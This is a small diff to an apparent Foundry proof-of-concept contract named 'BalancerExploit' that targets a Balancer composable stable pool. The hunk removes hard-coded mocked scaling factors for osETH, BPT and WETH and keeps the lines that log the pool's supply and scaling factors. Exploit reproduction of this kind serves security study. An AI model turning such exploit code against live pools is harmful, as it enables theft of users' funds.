@@ -90,12 +90,6 @@ contract BalancerExploit is Test {
         uint256 actualSupply = composableStablePool.getActualSupply();
         console.log("Initial actual supply:", actualSupply);
 
-        // Mock scalingFactors to use specific value for osETH
-        uint256[] memory mockedScalingFactors = new uint256[](3);
-        mockedScalingFactors[0] = 1e18; // osETH
-        mockedScalingFactors[1] = 1e18; // BPT
-        mockedScalingFactors[2] = 1058132408689971699; // WETH (fixed)
-
         scalingFactors = composableStablePool.getScalingFactors();
         console.log(
             "Updated scaling factors:",
